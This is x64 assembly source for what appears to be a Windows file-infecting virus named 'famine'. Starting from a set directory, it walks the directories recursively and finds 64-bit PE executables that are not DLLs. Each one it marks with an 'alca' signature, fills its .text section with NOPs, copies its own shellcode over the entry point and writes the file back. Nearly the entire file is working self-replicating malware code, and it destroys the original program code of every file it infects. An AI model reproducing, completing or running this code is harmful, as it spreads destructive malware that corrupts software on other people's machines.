[BITS 64]

section .text

    global famine
	global _alloc_find_data_strust
	global _closeHandleFile
	global _findNextFile
	global _openCurrentFile
	global _padTextSection
	global _copyShellcode1
	global _prepareChangeDirectory_prepareExit
	global _changeDirectory
	global _verifyDot



    extern FindFirstFileA
    extern FindNextFileA
    extern FindClose
    extern LocalAlloc
	

; ------------------------------------------------------ ;
; Parameters:
; rcx = path
; rdx = win32 find data structure
;
; return:
; rax = win32 find data structure
; ------------------------------------------------------ ;

famine:
    push rsp
    mov rbp, rsp
    sub rsp, 0x120

    mov r15, rax ; r15 = address table
    xor rax, rax

	lea rcx, [rbx + 0x45]
	call QWORD [ds:r15 + 80] ; SetCurrentDirectory("/tmp/test")

	xor rcx, rcx
	mov rdx, rcx
    add rcx, 0x40
    add rdx, 400 ; 16 * 25 = 400 (go 25 dir deep)
    call QWORD [ds:r15] ; Data_storage = LocalAlloc(LPTR, 400)
    mov QWORD [ss:rsp + 104], rax

_alloc_find_data_strust:
    xor rcx, rcx
    mov rdx, rcx
    add rcx, 0x40
    add rdx, 328
    call QWORD [ds:r15] ; FindData = LocalAlloc(LPTR, 328)
    mov r14, rax ; r14 = FindData

    ; Get information about the first file in the directory

    lea rcx, [rbx + 0x92]
    mov rdx, r14
    call QWORD [ds:r15 + 64] ; FindFirstFileA("*", &FindData)
    mov r13, rax ; r13 = hFindFile

	; cmp r13, -1
	; je _clearAndTerminate

    cmp r12, 1
	jz	_changeDirectory
	jmp	_openCurrentFile


_closeHandleFile:

	mov 	rcx, r12
	call 	QWORD [ds:r15 + 56]			; CloseHandle(hFile)


_findNextFile:
	
	mov 	rcx, r13
	mov 	rdx, r14
	call 	QWORD [ds:r15 + 72]			; HANDLE hFile = FindNextFileA(hFile, &win32_find_dataa_struct)
	cmp 	rax, 0 
	jz	_prepareChangeDirectory_prepareExit
	cmp 	r12, 1
	jz	_changeDirectory


_openCurrentFile:

	lea 	rcx, [r14 + 44]
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8 
	mov 	QWORD [ss:rsp + 0x20], 0x4
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	QWORD [ds:r15 + 24]	; CreateFileA(win32_find_dataa->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF
	jz	_findNextFile
	mov 	r12, rax			; *** r12: actual HANDLE hFile. We have read/write permissions over the file with this handle ***


;-----------------;
; Check file size ;
;-----------------;

	mov 	rcx, r12
	xor 	rdx, rdx
	call 	QWORD [ds:r15 + 32]		; GetFileSize(hFile, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF 	; if the size is invalid (INVALID_FILE_SIZE) ...
	jz	_closeHandleFile		; ... go back and close the handle
	mov 	rdi, rax 			; *** rdi: size of target file ***


;-------------------------------------------------------------------------------;
; Allocate memory in the heap to copy the opened file.. 			;
; ... then check if the file meets the following criteria:			;
; 										;
; 1) The first WORD must be equal to 'MZ'					;
; 2) Base of file + 0x3C (SIGNATURE) must be equal to 'PE'			;
; 3) WORD SIGNATURE + 4 must be equal to 0x8664 (64bit)				;
; 4) IMAGE_FILE_HEADER -> Characteristics must be less than 0x2000 (not a .dll)	;
; 5) Signature 'alca' must not present at the beginning of the .text 		;
;-------------------------------------------------------------------------------;

	xor 	rcx, rcx
	mov 	rdx, rcx
	add 	rcx, 0x0040
	add 	rdx, rdi
	call 	QWORD [ds:r15 + 0]		; LocalAlloc(LPTR, sizeof(target))
	mov 	rsi, rax 			; *** rsi: allocation where the file can be read into***
	
	mov 	rcx, r12
	mov 	rdx, rsi
	mov 	r8, rdi
	xor 	r9, r9 
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	QWORD [ds:r15 + 40]		; ReadFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToRead, NULL, NULL)

	cmp 	DWORD [rsi], 0x00905A4D		; check if 'MZ'
	jne 	_freeCall

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi

	cmp 	WORD [ds:rax], 0x4550 		; check if 'PE'
	jne 	_freeCall

	cmp 	WORD [ds:rax + 4], 0x8664	; check if 64bit
	jne 	_freeCall

	add 	rax, 16h
	mov 	rcx, rax 
	xor 	rax, rax 
	mov 	ax, WORD [ds:rcx]
	and 	rax, 0x2000
	cmp 	rax, 0 				; check if .exe
	jne 	_freeCall

	
	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi
	lea 	rax, [rax + 18h]
	lea 	rax, [rax + 0xf0]
	lea 	rax, [rax + 0xC]
	mov 	eax, DWORD [ds:rax]
	add 	rax, rsi
	cmp 	DWORD [ds:rax], 0x61636C61	; verify signature
	jz	_freeCall

	mov 	QWORD [ss:rsp + 120], r13	; store HANDLE hFile onto the stack for later use
	mov 	QWORD [ss:rsp + 112], r14	; store WIN32_FIND_DATAA struct onto the stack for later use
	

	xor 	r13, r13
	xchg 	rdi, r13			; *** r13 : size of target file ***
	push 	r12
	xor 	r12, r12
	add 	r12, 0x659 			; *** r12: size of this shellcode (hardcoded) ***
	xchg 	r14, rdi 
	pop 	r14				; *** r14: HANDLE hFile ***
	xor 	rdi, rdi 			; *** rdi: 0 ***

	

;-------------------------------------------------------;
; The actual infection starts here:			;
;							;
; 1) Get a pointer to .text section of the file		;
; 2) Pad the entire .text with nops			;
; 3) Get a pointer to the EntryPoint 			;
; 4) Copy this shellcode past the EntryPoint 		;
; 5) Overwrite the original file with the infected one  ;
;-------------------------------------------------------;

; Registers configuration at this moment:
; rbx: this_code entrypoint / rsi: &target_copy / r12: sizeof(this_code) / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi
	lea 	rax, [rax + 18h]
	lea 	rax, [rax + 0xf0]
	lea 	rax, [rax + 0xC]
	mov 	edi, DWORD [ds:rax]		; *** rdi: .text VirtualAddress ***
	lea 	rax, [rax + 4]
	mov 	eax, DWORD [ds:rax]		; *** rax: .text size ***
	lea 	rdi, [rsi + rdi]		; *** rdi: pointer to .text ***
	mov 	rcx, rdi
	mov 	rdx, rax
	xor 	rax, rax
	mov 	DWORD [rcx], 0x61636C61		; write signature 'alca'
	add 	rax, 4

_padTextSection:
	mov 	BYTE [ds:rcx + rax], 0x90 	; pad .text section
	inc 	rax
	cmp 	rax, rdx
	jne 	_padTextSection

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi
	lea 	rax, [rax + 18h]
	lea 	rax, [rax + 10h]
	mov 	eax, DWORD [ds:rax]		; *** rax: target entrypoint ***
	lea 	rax, [rsi + rax]

	mov 	rcx, rax
	xor 	rax, rax
	mov 	rdx, rax

_copyShellcode1:
	mov 	dl, BYTE [ds:rbx + rax]
	mov 	BYTE [ds:rcx + rax], dl 	; copy this shellcode
	inc 	rax
	cmp 	rax, r12
	jne	_copyShellcode1

	mov 	rcx, r14
	call 	QWORD [ds:r15 + 56]		; Close old HANDLE used to read the file
	
	mov 	rcx, QWORD [ss:rsp + 112]
	lea 	rcx, [rcx + 44]			; WIN32_FIND_DATAA->fileName
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8
	mov 	QWORD [ss:rsp + 0x20], 0x2
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	QWORD [ds:r15 + 24]	; CreateFileA(WIN32_FIND_DATAA->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	
	mov 	r14, rax
	mov 	rcx, r14
	mov 	rdx, rsi
	mov 	r8, r13
	xor 	r9, r9
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	QWORD [ds:r15 + 48]		; WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)
	mov 	rcx, r14
	call 	QWORD [ds:r15 + 56]		; CloseFile(hFile)


;------------------------------------------------------------;
; Jump back and find the next file after the infection       ;
;------------------------------------------------------------;

	mov 	rcx, rsi
	call 	QWORD [ds:r15 + 8]		; LocalFree(target_allocation)
	mov 	r13, QWORD [ss:rsp + 120]	; *** r13: restore HANDLE hFile for finding programs ***
	mov 	r14, QWORD [ss:rsp + 112]	; *** r14: restore WIN32_FIND_DATAA struct ***
	jmp	_findNextFile


;-----------------------------------------------------------------;
; The _freeCall procedure is needed when an invalid file is found ;
;-----------------------------------------------------------------;

_freeCall:
	mov 	rcx, rsi 
	call 	QWORD [ds:r15 + 8]		; LocalFree(target_allocation)
	jmp	_closeHandleFile


_prepareChangeDirectory_prepareExit:

;---------------------------------------------------;
; Check if we're in 'directory mode' (r12 == 1)     ;
; + If this mode is set, then go back one directory ;
; - If it's not, then turn it on		    ;
;---------------------------------------------------;
	cmp 	r12, 1
	jz	_goBackDir

	xor 	r12, r12
	inc 	r12
	mov 	rcx, r14
	call 	QWORD [ds:r15 + 8]		; LocalFree(win32_find_dataa)
	jmp	_alloc_find_data_strust


_changeDirectory:
	call 	_verifyDot
	
	cmp	rax, 0
	jz	_findNextFile

	lea 	rcx, [r14 + 44]
	call 	QWORD [r15 + 80]		; SetCurrentDirectoryA(directory)
	cmp	rax, 0
	jz	_findNextFile

	xor 	rax, rax
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_storeDirectoryData

	dec 	r12
	jmp	_alloc_find_data_strust



_verifyDot:
	xor 	rax, rax
	inc 	rax
	cmp 	WORD [ds:r14 + 44], 0x2E2E	; check if file is '..'
	jz	_returnError
	xor 	rcx, rcx
	add 	cl, BYTE [ds:r14 + 44]
	add 	cl, BYTE [ds:r14 + 45]
	cmp 	cl, 0x2E			; check if file is '.'
	jz	_returnError
	ret

_returnError:
	xor 	rax, rax 
	ret

_goBackDir:
	xor 	rcx, rcx
	lea 	rcx, [ds:rbx + 0x9A]		; rcx: '..'
	call 	QWORD [ds:r15 + 80]		; SetCurrentDirectory('..')
	cmp 	rax, 0
	jz	_clearAndTerminate

	xor 	rax, rax
	add 	rax, 384
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_retrieveDirectoryData
	jmp	_findNextFile

_clearAndTerminate:
	xor 	rcx, rcx
	call 	QWORD [ds:r15 + 16]




;-------------------------------------------------------------------------------;
; The _storeDirectoryData will store the HANDLE hFile (used for reading)	;
; + the WIN32_FIND_DATAA struct for later use					;
; The _retrieveDirectoryData will do the opposite				;
;-------------------------------------------------------------------------------;
; Requirements (_storeDirectoryData)						;
; - rax has to be zero								;
; - r11 has to be a pointer to the DirectoryData_storage allocation		;
; - r13 has to contain the old HANDLE						;
; - r14 has to be a pointer to the old win32_find_dataa struct			;
;										;
; Requirements (_retrieveDirectoryData)						;
; - rax needs to be equal to sizeof(DirectoryData_storage) (320 at the moment)	;
; - r11 needs to be a pointer to DirectoryData_storage				;
;-------------------------------------------------------------------------------;

_storeDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jne 	_addRax
	xchg 	QWORD [ds:r11 + rax], r13	; store previous HANDLE in DirectoryData_storage
	xchg 	QWORD [ds:r11 + rax + 8], r14	; store previous WIN32_FIND_DATAA struct in DirectoryData_storage
	ret

_addRax:
	add 	rax, 16 
	jmp 	_storeDirectoryData


_retrieveDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jz 	_subRax
	
	xor 	r13, r13
	mov 	r14, r13
	xchg 	r13, QWORD [ds:r11 + rax]	; restore previous HANDLE in r13 and zero out the previously occupied space in DirectoryData_storage
	xchg 	r14, QWORD [ds:r11 + rax + 8]	; restore previous WIN32_FIND_DATAA struct and zero out the previously occupied space in DirectoryData_storage
	ret

_subRax:
	sub 	rax, 16
	jmp 	_retrieveDirectoryData
